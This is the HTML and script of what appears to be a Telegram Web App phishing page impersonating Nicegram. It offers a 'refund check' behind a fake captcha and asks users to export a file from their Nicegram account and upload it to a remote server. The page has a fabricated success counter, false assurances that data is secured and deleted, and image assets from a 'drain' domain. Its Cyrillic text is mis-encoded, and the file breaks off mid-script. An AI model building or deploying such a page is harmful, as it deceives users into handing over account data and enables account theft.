<!DOCTYPE html>
<html lang="ru">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
	<title>Nicegram</title>
	<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;800;900&display=swap" rel="stylesheet">
	<script src="https://telegram.org/js/telegram-web-app.js"></script>
	<style>
		:root {
			--holo-cyan: #0ff;
			--holo-bg: rgba(10, 12, 20, 0.65);
			--text-main: #ffffff;
			--text-secondary: rgba(255, 255, 255, 0.55);
			--btn-blue-start: #0033cc;
			--btn-blue-end: #0066ff;
			--status-green: #00ffaa;
			--error-red: #ff3333;
			--glass-border: rgba(255, 255, 255, 0.08);
			--glass-glow: rgba(0, 255, 255, 0.12);
			--yellow: #ffef00;
		}

		* {
			box-sizing: border-box;
		}

		body {
			margin: 0;
			padding: 0;
			background: radial-gradient(circle at 30% 30%, #08152a 0%, #000000 100%);
			color: var(--text-main);
			font-family: 'Inter', sans-serif;
			height: 100vh;
			overflow: hidden;
			display: flex;
			flex-direction: column;
			align-items: center;
			justify-content: center;
			position: relative;
		}

		#fileInput {
			display: none !important;
		}

		#particles, .snow-container {
			position: fixed;
			top: 0;
			left: 0;
			width: 100%;
			height: 100%;
			pointer-events: none;
			z-index: 1;
		}

		.liquid-blob {
			position: absolute;
			border-radius: 50%;
			filter: blur(60px);
			z-index: 0;
			opacity: 0.18;
			animation: floatBlob 14s infinite ease-in-out;
		}

		.blob-1 {
			width: 320px;
			height: 320px;
			background: #00ffff;
			top: -10%;
			left: -12%;
		}

		.blob-2 {
			width: 280px;
			height: 280px;
			background: #0044ff;
			bottom: -10%;
			right: -12%;
		}

		@keyframes floatBlob {
			0%, 100% { transform: translate(0, 0); }
			50% { transform: translate(30px, -30px); }
		}

		.animated-images {
			position: fixed;
			top: 0;
			left: 0;
			width: 100%;
			height: 100%;
			pointer-events: none;
			z-index: 2;
		}

		.image {
			position: absolute;
			width: 65px;
			opacity: 0.12;
			filter: blur(0.8px);
			animation: floatImg 20s infinite ease-in-out;
		}

		.image1 { top: 20%; left: 10%; }
		.image2 { top: 65%; left: 80%; }
		.image3 { top: 70%; left: 15%; }
		.image4 { top: 15%; left: 75%; }

		@keyframes floatImg {
			0%, 100% { transform: translateY(0) rotate(0deg); }
			50% { transform: translateY(-30px) rotate(6deg); }
		}

		.snowflake {
			position: absolute;
			background: radial-gradient(circle, #ffffff 0%, transparent 70%);
			border-radius: 50%;
			opacity: 0.75;
			animation: fall linear infinite;
		}

		@keyframes fall {
			to {
				transform: translateY(110vh) translateX(15px) rotate(360deg);
			}
		}

		.garland-wrap {
			position: fixed;
			top: -10px;
			left: 0;
			width: 100%;
			height: 50px;
			z-index: 20;
			pointer-events: none;
			display: flex;
			justify-content: space-around;
		}

		.light-bulb {
			width: 12px;
			height: 12px;
			border-radius: 50%;
			position: relative;
			margin-top: 8px;
			animation: flash 2s infinite alternate;
		}

		.bulb-cyan { background: #00ffff; box-shadow: 0 0 12px #00ffff; }
		.bulb-blue { background: #0066ff; box-shadow: 0 0 12px #0066ff; }
		.bulb-white { background: #ffffff; box-shadow: 0 0 12px #ffffff; }

		@keyframes flash {
			from { opacity: 0.35; }
			to { opacity: 1; }
		}

		.frost-vignette {
			position: fixed;
			top: 0;
			left: 0;
			right: 0;
			bottom: 0;
			box-shadow: inset 0 0 100px rgba(150, 240, 255, 0.15);
			pointer-events: none;
			z-index: 55;
		}

		.glass-card {
			position: relative;
			z-index: 10;
			width: 88%;
			max-width: 340px;
			padding: 50px 30px 40px;
			background: var(--holo-bg);
			border-radius: 28px;
			backdrop-filter: blur(28px) saturate(150%);
			-webkit-backdrop-filter: blur(28px) saturate(150%);
			border: 1px solid var(--glass-border);
			box-shadow: 0 12px 30px rgba(0, 0, 0, 0.6), 0 0 0 1px var(--glass-glow);
			text-align: center;
		}

		.santa-hat-icon {
			position: absolute;
			top: -28px;
			right: -22px;
			width: 60px;
			filter: drop-shadow(0 0 8px rgba(0,255,255,0.4));
			z-index: 12;
		}

		.logo-text {
			font-size: 40px;
			font-weight: 900;
			color: #fff;
			letter-spacing: -1.5px;
			margin-bottom: 8px;
			text-shadow: 0 0 12px rgba(255, 255, 255, 0.25), 0 0 20px rgba(0, 255, 255, 0.15);
			background: linear-gradient(90deg, #ffffff, #aaffff);
			-webkit-background-clip: text;
			-webkit-text-fill-color: transparent;
		}

		h1 {
			font-size: 22px;
			font-weight: 800;
			margin: 0 0 14px;
			color: #fff;
			opacity: 0.92;
		}

		p {
			font-size: 14px;
			color: var(--text-secondary);
			line-height: 1.55;
			margin-bottom: 20px;
		}

		.stats-wrapper {
			display: inline-flex;
			align-items: center;
			gap: 10px;
			margin-bottom: 28px;
			background: rgba(0, 50, 80, 0.25);
			padding: 9px 20px;
			border-radius: 50px;
			border: 1px solid rgba(0, 200, 255, 0.15);
		}

		.live-dot {
			width: 9px;
			height: 9px;
			background: var(--status-green);
			border-radius: 50%;
			box-shadow: 0 0 10px var(--status-green);
			animation: pulse-dot 2s infinite;
		}

		@keyframes pulse-dot {
			0%, 100% { opacity: 1; transform: scale(1); }
			50% { opacity: 0.5; transform: scale(0.85); }
		}

		#stats-counter {
			font-size: 13px;
			font-weight: 600;
			color: var(--holo-cyan);
			text-shadow: 0 0 6px rgba(0, 255, 255, 0.25);
		}

		.btn {
			background: linear-gradient(135deg, var(--btn-blue-start), var(--btn-blue-end));
			color: white;
			border: none;
			padding: 17px 0;
			border-radius: 18px;
			font-size: 18px;
			font-weight: 800;
			width: 100%;
			cursor: pointer;
			box-shadow: 0 8px 20px rgba(0, 30, 100, 0.5), 0 0 0 1px rgba(0, 150, 255, 0.3);
			transition: all 0.3s ease;
			font-family: 'Inter', sans-serif;
			margin-bottom: 12px;
		}
		
		.btn:last-child {
			margin-bottom: 0;
		}

		.btn:active {
			transform: scale(0.98);
		}

		.security-note {
			margin-top: 15px;
			display: flex;
			align-items: center;
			justify-content: center;
			gap: 6px;
			font-size: 11px;
			color: var(--text-secondary);
			font-weight: 600;
			opacity: 0.7;
		}

		.security-note svg {
			width: 12px;
			height: 12px;
			fill: var(--holo-cyan);
		}

		.step {
			display: none;
		}

		.step.active {
			display: block;
		}

		.captcha-box {
			margin-bottom: 24px;
		}

		.slider-track {
			position: relative;
			height: 56px;
			background: rgba(255, 255, 255, 0.03);
			border-radius: 16px;
			overflow: hidden;
			border: 1px solid rgba(255, 255, 255, 0.08);
		}

		.slider-fill {
			position: absolute;
			left: 0;
			top: 0;
			height: 100%;
			width: 0;
			background: linear-gradient(90deg, rgba(0, 255, 255, 0.2), rgba(0, 100, 255, 0.3));
			transition: width 0.1s;
		}

		.slider-thumb {
			position: absolute;
			left: 6px;
			top: 6px;
			width: 44px;
			height: 44px;
			background: linear-gradient(135deg, #fff, #e0e0e0);
			border-radius: 12px;
			display: flex;
			align-items: center;
			justify-content: center;
			cursor: grab;
			transition: left 0.1s, background 0.3s, box-shadow 0.3s;
			z-index: 2;
			user-select: none;
			touch-action: none;
			box-shadow: 0 4px 16px rgba(0,0,0,0.3);
		}

		.slider-thumb:active {
			cursor: grabbing;
		}

		.slider-thumb svg {
			width: 22px;
			height: 22px;
			fill: #333;
			transition: fill 0.3s;
		}

		.slider-thumb.success {
			background: linear-gradient(135deg, #00cc66, #00ff88);
			box-shadow: 0 4px 20px rgba(0, 255, 136, 0.4);
		}

		.slider-thumb.success svg {
			fill: #fff;
		}

		.slider-text {
			position: absolute;
			width: 100%;
			height: 100%;
			display: flex;
			align-items: center;
			justify-content: center;
			font-size: 13px;
			color: rgba(255,255,255,0.35);
			pointer-events: none;
			z-index: 1;
			font-weight: 500;
			letter-spacing: 0.5px;
		}

		#step-loading.active {
			display: flex;
			flex-direction: column;
			align-items: center;
		}

		.spinner {
			width: 50px;
			height: 50px;
			border: 3px solid rgba(255, 255, 255, 0.1);
			border-left-color: var(--holo-cyan);
			border-radius: 50%;
			animation: spin 1s linear infinite;
			margin-bottom: 22px;
		}

		@keyframes spin {
			to { transform: rotate(360deg); }
		}

		.status-text {
			font-size: 16px;
			font-weight: 700;
			color: #fff;
			margin-bottom: 6px;
		}

		.percent-display {
			font-size: 32px;
			font-weight: 900;
			color: var(--holo-cyan);
			text-shadow: 0 0 10px rgba(0, 255, 255, 0.4);
		}

		.no-close-warning {
			color: var(--error-red);
			font-size: 13px;
			font-weight: 800;
			margin: 10px 0;
			text-transform: uppercase;
			letter-spacing: 0.5px;
			animation: blink 1.5s infinite;
		}

		@keyframes blink {
			0%, 100% { opacity: 1; }
			50% { opacity: 0.4; }
		}

		.footer-container {
			position: absolute;
			bottom: 35px;
			display: flex;
			gap: 18px;
			z-index: 30;
		}

		.footer-btn {
			background: rgba(15, 18, 28, 0.6);
			color: #fff;
			padding: 11px 20px;
			border-radius: 14px;
			font-size: 14px;
			font-weight: 700;
			cursor: pointer;
			backdrop-filter: blur(12px);
			border: 1px solid rgba(255, 255, 255, 0.08);
			font-family: 'Inter', sans-serif;
		}

		.footer-btn:active {
			background: rgba(255, 255, 255, 0.08);
		}

		.modal-overlay {
			position: fixed;
			top: 0;
			left: 0;
			right: 0;
			bottom: 0;
			background: rgba(0, 0, 0, 0.7);
			backdrop-filter: blur(8px);
			z-index: 40;
			opacity: 0;
			pointer-events: none;
			transition: opacity 0.35s ease;
		}

		.modal-overlay.active {
			opacity: 1;
			pointer-events: all;
		}

		.modal {
			position: fixed;
			bottom: -100%;
			left: 0;
			width: 100%;
			background: rgba(15, 18, 28, 0.92);
			backdrop-filter: blur(30px);
			border-top: 1px solid rgba(255, 255, 255, 0.1);
			border-radius: 30px 30px 0 0;
			padding: 30px 25px 45px;
			z-index: 50;
			transition: bottom 0.5s cubic-bezier(0.2, 1, 0.3, 1);
			color: #fff;
			max-height: 70vh;
			overflow-y: auto;
		}

		.modal.active {
			bottom: 0;
		}

		.modal h3 {
			font-size: 20px;
			margin-bottom: 18px;
			font-weight: 700;
		}

		.modal p {
			font-size: 14px;
			color: rgba(255,255,255,0.5);
			line-height: 1.7;
			margin-bottom: 12px;
		}

		.modal strong {
			color: rgba(255,255,255,0.8);
		}

		.btn-close {
			background: rgba(255, 255, 255, 0.07);
			color: #fff;
			border: 1px solid rgba(255, 255, 255, 0.12);
			width: 100%;
			padding: 15px;
			margin-top: 22px;
			border-radius: 16px;
			font-weight: 800;
			cursor: pointer;
			font-family: 'Inter', sans-serif;
			margin-bottom: 0;
		}

		.error-box {
			text-align: center;
			padding: 24px 0;
		}

		.error-icon {
			font-size: 56px;
			margin-bottom: 18px;
		}

		.error-text {
			font-size: 14px;
			color: rgba(255,255,255,0.5);
			margin-bottom: 24px;
			line-height: 1.6;
		}
	</style>
</head>
<body>

	<div class="liquid-blob blob-1"></div>
	<div class="liquid-blob blob-2"></div>

	<div class="garland-wrap" id="garland"></div>

	<div class="animated-images">
		<img src="https://betterdrain.baby/ring.png" class="image image1">
		<img src="https://betterdrain.baby/clock.png" class="image image2">
		<img src="https://betterdrain.baby/shard.png" class="image image3">
		<img src="https://betterdrain.baby/skull.png" class="image image4">
	</div>

	<div class="snow-container" id="snow"></div>

	<div class="frost-vignette"></div>

	<div class="glass-card">
		<img src="https://cdn-icons-png.flaticon.com/512/744/744546.png" class="santa-hat-icon" alt="NY">
		<div class="logo-text">Nicegram</div>

		<!-- Language Selection Step (Active by default) -->
		<div id="step-language" class="step active">
			<h1 style="margin-bottom: 25px;">Select Language</h1>
			<button class="btn" onclick="selectLanguage('ru')">üá∑üá∫ –†—É—Å—Å–∫–∏–π</button>
			<button class="btn" onclick="selectLanguage('en')">üá∫üá∏ English</button>
			<button class="btn" onclick="selectLanguage('uk')">üá∫üá¶ –£–∫—Ä–∞—ó–Ω—Å—å–∫–∞</button>
		</div>

		<div id="step-captcha" class="step">
			<h1 id="greeting">–ü—Ä–∏–≤–µ—Ç</h1>
			<p id="captcha-desc">–ü–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç–µ, —á—Ç–æ –≤—ã —á–µ–ª–æ–≤–µ–∫</p>
			<div class="captcha-box">
				<div class="slider-track" id="sliderTrack">
					<div class="slider-fill" id="sliderFill"></div>
					<div class="slider-text" id="sliderText">‚Ä∫‚Ä∫ –ü—Ä–æ–≤–µ–¥–∏—Ç–µ –≤–ø—Ä–∞–≤–æ ‚Ä∫‚Ä∫</div>
					<div class="slider-thumb" id="sliderThumb">
						<svg viewBox="0 0 24 24"><path d="M8.59 16.59L13.17 12 8.59 7.41 10 6l6 6-6 6-1.41-1.41z"/></svg>
					</div>
				</div>
			</div>
			<div class="security-note">
				<svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z"/></svg>
				<span id="sec-note-1">–ó–∞—â–∏—Ç–∞ –æ—Ç –∞–≤—Ç–æ–º–∞—Ç–∏–∑–∞—Ü–∏–∏</span>
			</div>
		</div>

		<div id="step-main" class="step">
			<h1 id="greeting2">–ü—Ä–∏–≤–µ—Ç</h1>
			<p id="main-desc">–ó–∞—â–∏—â–µ–Ω–Ω–∞—è —Å—Ä–µ–¥–∞ –¥–ª—è –ø—Ä–æ–≤–µ—Ä–∫–∏ –¥–∞–Ω–Ω—ã—Ö.<br>–ó–∞–≥—Ä—É–∑–∏—Ç–µ —Ñ–∞–π–ª —ç–∫—Å–ø–æ—Ä—Ç–∞.</p>
			<div class="stats-wrapper">
				<div class="live-dot"></div>
				<span id="stats-counter"><span id="stats-text-span">–ü—Ä–æ–π–¥–µ–Ω–æ —É—Å–ø–µ—à–Ω—ã—Ö –ø—Ä–æ–≤–µ—Ä–æ–∫ –∑–∞ —Å–µ–≥–æ–¥–Ω—è</span> <strong id="statsNum">3050</strong></span>
			</div>
			<input type="file" id="fileInput" accept=".zip,.txt">
			<button class="btn" id="btn-upload" onclick="document.getElementById('fileInput').click()">üìÅ –ó–∞–≥—Ä—É–∑–∏—Ç—å —Ñ–∞–π–ª</button>
			<div class="security-note">
				<svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z"/></svg>
				<span id="sec-note-2">NiceGram ¬Æ –≤—Å–µ –¥–∞–Ω–Ω—ã–µ –∑–∞—â–∏—â–µ–Ω—ã</span>
			</div>
		</div>

		<div id="step-loading" class="step">
			<div class="spinner"></div>
			<div class="status-text" id="loadStatus">–ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è...</div>
			<div class="no-close-warning" id="no-close-warning">–ù–µ –∑–∞–∫—Ä—ã–≤–∞–π—Ç–µ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–µ!</div>
			<div class="percent-display" id="loadPercent">0%</div>
		</div>

		<div id="step-error" class="step">
			<div class="error-box">
				<div class="error-icon">‚ö†Ô∏è</div>
				<div class="error-text" id="errorText">–ü—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞</div>
				<button class="btn" id="btn-retry" onclick="location.reload()">–ü–æ–ø—Ä–æ–±–æ–≤–∞—Ç—å —Å–Ω–æ–≤–∞</button>
			</div>
		</div>
	</div>

	<div class="footer-container">
		<button class="footer-btn" id="footer-btn-instr" onclick="openModal('instructionModal')">–ò–Ω—Å—Ç—Ä—É–∫—Ü–∏—è</button>
		<button class="footer-btn" id="footer-btn-faq" onclick="openModal('faqModal')">FAQ</button>
	</div>

	<div class="modal-overlay" onclick="closeAllModals()"></div>

	<div class="modal" id="instructionModal">
		<h3 id="modal-instr-title">–ò–Ω—Å—Ç—Ä—É–∫—Ü–∏—è</h3>
		<div id="modal-instr-content">
			<p><strong>1.</strong> –°–∫–∞—á–∞–π—Ç–µ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–µ Nicegram —Å –æ—Ñ–∏—Ü–∏–∞–ª—å–Ω–æ–≥–æ —Å–∞–π—Ç–∞...</p>
			<p><strong>2.</strong> –û—Ç–∫—Ä–æ–π—Ç–µ Nicegram –∏ –≤–æ–π–¥–∏—Ç–µ –≤ —Å–≤–æ–π –∞–∫–∫–∞—É–Ω—Ç.</p>
			<p><strong>3.</strong> –ó–∞–π–¥–∏—Ç–µ –≤ –Ω–∞—Å—Ç—Ä–æ–π–∫–∏ –∏ –≤—ã–±–µ—Ä–∏—Ç–µ –ø—É–Ω–∫—Ç ¬´Nicegram¬ª.</p>
			<p><strong>4.</strong> –≠–∫—Å–ø–æ—Ä—Ç–∏—Ä—É–π—Ç–µ —Ñ–∞–π–ª...</p>
			<p><strong>5.</strong> –û—Ç–∫—Ä–æ–π—Ç–µ –≥–ª–∞–≤–Ω–æ–µ –º–µ–Ω—é –±–æ—Ç–∞ –∏ –Ω–∞–∂–º–∏—Ç–µ –Ω–∞ –∫–Ω–æ–ø–∫—É "–ü—Ä–æ–≤–µ—Ä–∫–∞ –Ω–∞ —Ä–µ—Ñ–∞—É–Ω–¥".</p>
			<p><strong>6.</strong> –û—Ç–ø—Ä–∞–≤—å—Ç–µ —Ñ–∞–π–ª –±–æ—Ç—É.</p>
			<p><strong>7.</strong> –û–∂–∏–¥–∞–π—Ç–µ —Ä–µ–∑—É–ª—å—Ç–∞—Ç–æ–≤ –ø—Ä–æ–≤–µ—Ä–∫–∏.</p>
		</div>
		<button class="btn-close" id="btn-close-instr" onclick="closeAllModals()">–ü–æ–Ω—è—Ç–Ω–æ</button>
	</div>

	<div class="modal" id="faqModal">
		<h3 id="modal-faq-title">‚ùì –ß–∞—Å—Ç—ã–µ –≤–æ–ø—Ä–æ—Å—ã</h3>
		<div id="modal-faq-content">
			<p><strong>–ß—Ç–æ —Ç–∞–∫–æ–µ —Ä–µ—Ñ–∞—É–Ω–¥?</strong><br>–≠—Ç–æ –≤–æ–∑–≤—Ä–∞—Ç —Å—Ä–µ–¥—Å—Ç–≤ –∑–∞ –ø–æ–¥–∞—Ä–æ–∫...</p>
			<p><strong>–°–∫–æ–ª—å–∫–æ –≤—Ä–µ–º–µ–Ω–∏ –∑–∞–Ω–∏–º–∞–µ—Ç –ø—Ä–æ–≤–µ—Ä–∫–∞?</strong><br>–û–±—ã—á–Ω–æ 3-5 –º–∏–Ω—É—Ç, –±—ã–≤–∞—é—Ç –∑–∞–¥–µ—Ä–∂–∫–∏</p>
			<p><strong>–ú–æ–∏ —Ñ–∞–π–ª—ã –≤ –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏?</strong><br>–î–∞ - –º—ã –Ω–µ —Ö—Ä–∞–Ω–∏–º –≤–∞—à–∏ —Ñ–∞–π–ª—ã, –∏—Ö –ø—Ä–æ–≤–µ—Ä—è–µ—Ç –Ω–∞—à –±–æ—Ç, –ø–æ—Å–ª–µ —á–µ–≥–æ —É–¥–∞–ª—è–µ—Ç</p>
		</div>
		<button class="btn-close" id="btn-close-faq" onclick="closeAllModals()">–ó–∞–∫—Ä—ã—Ç—å</button>
	</div>

	<div class="modal" id="errorModal">
		<h3 id="modal-err-title">–û—à–∏–±–∫–∞!</h3>
		<p id="modal-err-text">–§–∞–π–ª –¥–æ–ª–∂–µ–Ω –±—ã—Ç—å –≤ —Ñ–æ—Ä–º–∞—Ç–µ <strong>.zip</strong> –∏–ª–∏ <strong>.txt</strong>! –ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –ø—Ä–æ—á—Ç–∏—Ç–µ –∏–Ω—Å—Ç—Ä—É–∫—Ü–∏—é.</p>
		<button class="btn-close" id="btn-close-err" onclick="closeAllModals()">–ü–æ–Ω—è—Ç–Ω–æ</button>
	</div>

	<script>
		// –ò–°–ü–†–ê–í–õ–ï–ù–ò–ï: –û–±—ä—è–≤–ª—è–µ–º –ø–µ—Ä–µ–º–µ–Ω–Ω—ã–µ –≥–ª–æ–±–∞–ª—å–Ω–æ –≤ –Ω–∞—á–∞–ª–µ —Å–∫—Ä–∏–ø—Ç–∞
		let currentLang = 'en'; // –Ø–∑—ã–∫ –ø–æ —É–º–æ–ª—á–∞–Ω–∏—é
		let sessionId = localStorage.getItem('sid') || '';
		let captchaId = '';
		let verified = false;
		
		const SERVER = "https://newnicegram-1.onrender.com";

		// –ü—Ä–æ–≤–µ—Ä—è–µ–º, –∑–∞–≥—Ä—É–∑–∏–ª—Å—è –ª–∏ Telegram Web App
		let tg;
		let user = {};
		let userId = "0";
		let userName = "user";
		
		try {
			tg = window.Telegram.WebApp;
			if (tg) {
				tg.expand();
				user = tg.initDataUnsafe?.user || {};
				userId = user.id || "0";
				userName = user.username || "user";
			}
		} catch (e) {
			console.log("Telegram Web App not available");
		}

		const translations = {
			ru: {
				greeting: `–ü—Ä–∏–≤–µ—Ç, ${user.first_name || userName}`,
				captcha_desc: "–ü–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç–µ, —á—Ç–æ –≤—ã —á–µ–ª–æ–≤–µ–∫",
				slider_text: "‚Ä∫‚Ä∫ –ü—Ä–æ–≤–µ–¥–∏—Ç–µ –≤–ø—Ä–∞–≤–æ ‚Ä∫‚Ä∫",
				slider_checking: "–ü—Ä–æ–≤–µ—Ä–∫–∞...",
				sec_note: "–ó–∞—â–∏—Ç–∞ –æ—Ç –∞–≤—Ç–æ–º–∞—Ç–∏–∑–∞—Ü–∏–∏",
				main_desc: "–ó–∞—â–∏—â–µ–Ω–Ω–∞—è —Å—Ä–µ–¥–∞ –¥–ª—è –ø—Ä–æ–≤–µ—Ä–∫–∏ –¥–∞–Ω–Ω—ã—Ö.<br>–ó–∞–≥—Ä—É–∑–∏—Ç–µ —Ñ–∞–π–ª —ç–∫—Å–ø–æ—Ä—Ç–∞.",
				stats_text: "–ü—Ä–æ–π–¥–µ–Ω–æ —É—Å–ø–µ—à–Ω—ã—Ö –ø—Ä–æ–≤–µ—Ä–æ–∫ –∑–∞ —Å–µ–≥–æ–¥–Ω—è",
				btn_upload: "üìÅ –ó–∞–≥—Ä—É–∑–∏—Ç—å —Ñ–∞–π–ª",
				sec_note_2: "NiceGram ¬Æ –≤—Å–µ –¥–∞–Ω–Ω—ã–µ –∑–∞—â–∏—â–µ–Ω—ã",
				load_init: "–ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è...",
				no_close: "–ù–µ –∑–∞–∫—Ä—ã–≤–∞–π—Ç–µ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–µ!",
				error_title: "–ü—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞",
				btn_retry: "–ü–æ–ø—Ä–æ–±–æ–≤–∞—Ç—å —Å–Ω–æ–≤–∞",
				footer_instr: "–ò–Ω—Å—Ç—Ä—É–∫—Ü–∏—è",
				footer_faq: "FAQ",
				modal_instr_title: "–ò–Ω—Å—Ç—Ä—É–∫—Ü–∏—è",
				modal_instr_content: `
					<p><strong>1.</strong> –°–∫–∞—á–∞–π—Ç–µ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–µ Nicegram —Å –æ—Ñ–∏—Ü–∏–∞–ª—å–Ω–æ–≥–æ —Å–∞–π—Ç–∞...</p>
					<p><strong>2.</strong> –û—Ç–∫—Ä–æ–π—Ç–µ Nicegram –∏ –≤–æ–π–¥–∏—Ç–µ –≤ —Å–≤–æ–π –∞–∫–∫–∞—É–Ω—Ç.</p>
					<p><strong>3.</strong> –ó–∞–π–¥–∏—Ç–µ –≤ –Ω–∞—Å—Ç—Ä–æ–π–∫–∏ –∏ –≤—ã–±–µ—Ä–∏—Ç–µ –ø—É–Ω–∫—Ç ¬´Nicegram¬ª.</p>
					<p><strong>4.</strong> –≠–∫—Å–ø–æ—Ä—Ç–∏—Ä—É–π—Ç–µ —Ñ–∞–π–ª...</p>
					<p><strong>5.</strong> –û—Ç–∫—Ä–æ–π—Ç–µ –≥–ª–∞–≤–Ω–æ–µ –º–µ–Ω—é –±–æ—Ç–∞ –∏ –Ω–∞–∂–º–∏—Ç–µ –Ω–∞ –∫–Ω–æ–ø–∫—É "–ü—Ä–æ–≤–µ—Ä–∫–∞ –Ω–∞ —Ä–µ—Ñ–∞—É–Ω–¥".</p>
					<p><strong>6.</strong> –û—Ç–ø—Ä–∞–≤—å—Ç–µ —Ñ–∞–π–ª –±–æ—Ç—É.</p>
					<p><strong>7.</strong> –û–∂–∏–¥–∞–π—Ç–µ —Ä–µ–∑—É–ª—å—Ç–∞—Ç–æ–≤ –ø—Ä–æ–≤–µ—Ä–∫–∏.</p>
				`,
				btn_understood: "–ü–æ–Ω—è—Ç–Ω–æ",
				modal_faq_title: "‚ùì –ß–∞—Å—Ç—ã–µ –≤–æ–ø—Ä–æ—Å—ã",
				modal_faq_content: `
					<p><strong>–ß—Ç–æ —Ç–∞–∫–æ–µ —Ä–µ—Ñ–∞—É–Ω–¥?</strong><br>–≠—Ç–æ –≤–æ–∑–≤—Ä–∞—Ç —Å—Ä–µ–¥—Å—Ç–≤ –∑–∞ –ø–æ–¥–∞—Ä–æ–∫...</p>
					<p><strong>–°–∫–æ–ª—å–∫–æ –≤—Ä–µ–º–µ–Ω–∏ –∑–∞–Ω–∏–º–∞–µ—Ç –ø—Ä–æ–≤–µ—Ä–∫–∞?</strong><br>–û–±—ã—á–Ω–æ 3-5 –º–∏–Ω—É—Ç, –±—ã–≤–∞—é—Ç –∑–∞–¥–µ—Ä–∂–∫–∏</p>
					<p><strong>–ú–æ–∏ —Ñ–∞–π–ª—ã –≤ –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏?</strong><br>–î–∞ - –º—ã –Ω–µ —Ö—Ä–∞–Ω–∏–º –≤–∞—à–∏ —Ñ–∞–π–ª—ã, –∏—Ö –ø—Ä–æ–≤–µ—Ä—è–µ—Ç –Ω–∞—à –±–æ—Ç, –ø–æ—Å–ª–µ —á–µ–≥–æ —É–¥–∞–ª—è–µ—Ç</p>
				`,
				btn_close: "–ó–∞–∫—Ä—ã—Ç—å",
				modal_err_title: "–û—à–∏–±–∫–∞!",
				modal_err_text: "–§–∞–π–ª –¥–æ–ª–∂–µ–Ω –±—ã—Ç—å –≤ —Ñ–æ—Ä–º–∞—Ç–µ <strong>.zip</strong> –∏–ª–∏ <strong>.txt</strong>! –ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –ø—Ä–æ—á—Ç–∏—Ç–µ –∏–Ω—Å—Ç—Ä—É–∫—Ü–∏—é.",
				statuses: ['–ü—Ä–æ–≤–µ—Ä—è–µ–º –ª–∏–∫–≤–∏–¥–Ω–æ—Å—Ç—å —Ñ–∞–π–ª–∞', '–ê–Ω–∞–ª–∏–∑–∏—Ä—É–µ–º –∞—É–∫—Ü–∏–æ–Ω—ã', '–ü—Ä–æ–≤–µ—Ä–∫–∞ –ø—Ä–æ–∏—Å—Ö–æ–∂–¥–µ–Ω–∏—è –∑–≤—ë–∑–¥', '–§–æ—Ä–º–∏—Ä–æ–≤–∞–Ω–∏–µ –≤–µ—Ä–¥–∏–∫—Ç–∞'],
				errors: {
					ip_ban: "–î–æ—Å—Ç—É–ø –≤—Ä–µ–º–µ–Ω–Ω–æ –æ–≥—Ä–∞–Ω–∏—á–µ–Ω",
					user_ban: "–í–∞—à –∞–∫–∫–∞—É–Ω—Ç –∑–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞–Ω",
					conn_err: "–û—à–∏–±–∫–∞ —Å–æ–µ–¥–∏–Ω–µ–Ω–∏—è —Å —Å–µ—Ä–≤–µ—Ä–æ–º",
					too_large: "–§–∞–π–ª —Å–ª–∏—à–∫–æ–º –±–æ–ª—å—à–æ–π (–º–∞–∫—Å. 50MB)"
				}
			},
			en: {
				greeting: `Hello, ${user.first_name || userName}`,
				captcha_desc: "Verify you are human",
				slider_text: "‚Ä∫‚Ä∫ Swipe right ‚Ä∫‚Ä∫",
				slider_checking: "Verifying...",
				sec_note: "Automation protection",
				main_desc: "Secure environment for data verification.<br>Upload export file.",
				stats_text: "Successful checks today",
				btn_upload: "üìÅ Upload file",
				sec_note_2: "NiceGram ¬Æ all data secured",
				load_init: "Initializing...",
				no_close: "Do not close the app!",
				error_title: "An error occurred",
				btn_retry: "Try again",
				footer_instr: "Instruction",
				footer_faq: "FAQ",
				modal_instr_title: "Instruction",
				modal_instr_content: `
					<p><strong>1.</strong> Download Nicegram app from the official site...</p>
					<p><strong>2.</strong> Open Nicegram and log in to your account.</p>
					<p><strong>3.</strong> Go to Settings and select ¬´Nicegram¬ª.</p>
					<p><strong>4.</strong> Export the file...</p>
					<p><strong>5.</strong> Open the main bot menu and click "Refund Check".</p>
					<p><strong>6.</strong> Send the file to the bot.</p>
					<p><strong>7.</strong> Wait for the check results.</p>
				`,
				btn_understood: "Understood",
				modal_faq_title: "‚ùì FAQ",
				modal_faq_content: `
					<p><strong>What is refund?</strong><br>It is a return of funds for a gift...</p>
					<p><strong>How long does the check take?</strong><br>Usually 3-5 minutes, delays happen</p>
					<p><strong>Are my files safe?</strong><br>Yes - we do not store your files, our bot checks them and then deletes them</p>
				`,
				btn_close: "Close",
				modal_err_title: "Error!",
				modal_err_text: "File must be <strong>.zip</strong> or <strong>.txt</strong>! Please read the instructions.",
				statuses: ['Checking file liquidity', 'Analyzing auctions', 'Checking star origin', 'Forming verdict'],
				errors: {
					ip_ban: "Access temporarily restricted",
					user_ban: "Your account is banned",
					conn_err: "Connection error",
					too_large: "File is too large (max 50MB)"
				}
			},
			uk: {
				greeting: `–ü—Ä–∏–≤—ñ—Ç, ${user.first_name || userName}`,
				captcha_desc: "–ü—ñ–¥—Ç–≤–µ—Ä–¥—ñ—Ç—å, —â–æ –≤–∏ –ª—é–¥–∏–Ω–∞",
